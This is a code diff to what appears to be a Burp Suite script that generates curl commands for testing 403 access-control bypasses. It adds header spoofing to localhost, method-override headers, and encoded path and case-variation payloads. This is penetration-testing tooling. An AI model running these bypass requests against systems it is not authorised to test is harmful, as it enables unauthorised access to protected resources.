@@ -39,10 +39,10 @@ source: |
       baseHeaderArgs.append(" -H '" + name + ": " + value + "'");
   }
 
-  // Categorized headers from nomore403
+  // Categorized headers from nomore403 (enhanced)
   String[] urlHeaders = {
-      "X-Original-URL", "X-Rewrite-URL", "Request-Uri", "Uri", "Url", 
-      "Base-Url", "Http-Url", "Proxy-Url", "Redirect", "Referer", 
+      "X-Original-URL", "X-Rewrite-URL", "X-Rewrite-Path", "Request-Uri", "Uri", "Url",
+      "Base-Url", "Http-Url", "Proxy-Url", "Redirect", "Referer",
       "Referrer", "X-HTTP-DestinationURL", "X-Proxy-Url", "Location"
   };
 
@@ -80,10 +80,10 @@ source: |
       for (String val : ipValues) {
           output.append("curl -k -i -s -X ").append(method)
                 .append(baseHeaderArgs)
-                .append(" -H '" + header + ": ").append(val).append("'"
+                .append(" -H '" + header + ": ").append(val).append("'")
                 .append(" '" + url + "'")
-                .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\[").append(header).append("=").append(val).append("\] /\"
-");
+                .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\\\\[").append(header).append("=").append(val).append("\\\\] /\"")
+                .append("\n");
       }
   }
 
@@ -92,26 +92,87 @@ source: |
       for (String val : hostValues) {
           output.append("curl -k -i -s -X ").append(method)
                 .append(baseHeaderArgs)
-                .append(" -H '" + header + ": ").append(val).append("'"
+                .append(" -H '" + header + ": ").append(val).append("'")
                 .append(" '" + url + "'")
-                .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\[").append(header).append("=").append(val).append("\] /\"
-");
+                .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\\\\[").append(header).append("=").append(val).append("\\\\] /\"")
+                .append("\n");
       }
   }
 
   output.append("\n# --- URL/Path Based Header Bypasses ---\n");
   // Values for URL headers: the path itself, or full localhost URL
-  String[] urlValues = { path, "http://127.0.0.1" + path };
-  
+  String[] urlValues = { path, "http://127.0.0.1" + path, "http://localhost" + path };
+
   for (String header : urlHeaders) {
       for (String val : urlValues) {
           output.append("curl -k -i -s -X ").append(method)
                 .append(baseHeaderArgs)
-                .append(" -H '" + header + ": ").append(val).append("'"
+                .append(" -H '" + header + ": ").append(val).append("'")
                 .append(" '" + url + "'")
-                .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\[").append(header).append("=").append(val).append("\] /\"
-");
+                .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\\\\[").append(header).append("=").append(val).append("\\\\] /\"")
+                .append("\n");
+      }
+  }
+
+  output.append("\n# --- HTTP Method Override Header Bypasses ---\n");
+  String[] methodOverrideHeaders = {
+      "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override", "X-Method"
+  };
+
+  String[] methodOverrideValues = {
+      "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"
+  };
+
+  for (String header : methodOverrideHeaders) {
+      for (String methodVal : methodOverrideValues) {
+          if (!methodVal.equals(method)) {
+              output.append("curl -k -i -s -X ").append(method)
+                    .append(baseHeaderArgs)
+                    .append(" -H '" + header + ": ").append(methodVal).append("'")
+                    .append(" '" + url + "'")
+                    .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\\\\[").append(header).append("=").append(methodVal).append("\\\\] /\"")
+                    .append("\n");
+          }
+      }
+  }
+
+  output.append("\n# --- Path Manipulation Bypasses ---\n");
+  String[] pathPayloads = {
+      "/", "//", "/.", "/./", "/%2e/", "/%2e%2e/", "/;", "/?", "/#",
+      ".json", ".php", ".asp", ".aspx", "%00", "%20", "%09",
+      "/%2f", "/%252f", "/%c0%af", "..%2f", "%2e%2e%2f",
+      "///", "/%252e/", "??"
+  };
+
+  for (String payload : pathPayloads) {
+      String modifiedUrl = url.replace(path, path + payload);
+      output.append("curl -k -i -s -X ").append(method)
+            .append(baseHeaderArgs)
+            .append(" '" + modifiedUrl + "'")
+            .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\\\\[Path:").append(payload.replace("/", "\\/")).append("\\\\] /\"")
+            .append("\n");
+  }
+
+  // Case variations
+  output.append("\n# --- Case Variation Bypasses ---\n");
+  if (path.length() > 1) {
+      String[] caseVariations = {
+          path.toUpperCase(),
+          path.toLowerCase(),
+          path.substring(0, 1).toUpperCase() + path.substring(1).toLowerCase()
+      };
+
+      for (String casePath : caseVariations) {
+          if (!casePath.equals(path)) {
+              String modifiedUrl = url.replace(path, casePath);
+              output.append("curl -k -i -s -X ").append(method)
+                    .append(baseHeaderArgs)
+                    .append(" '" + modifiedUrl + "'")
+                    .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\\\\[Case:").append(casePath).append("\\\\] /\"")
+                    .append("\n");
+          }
       }
   }
 
   logging.logToOutput(output.toString());
+
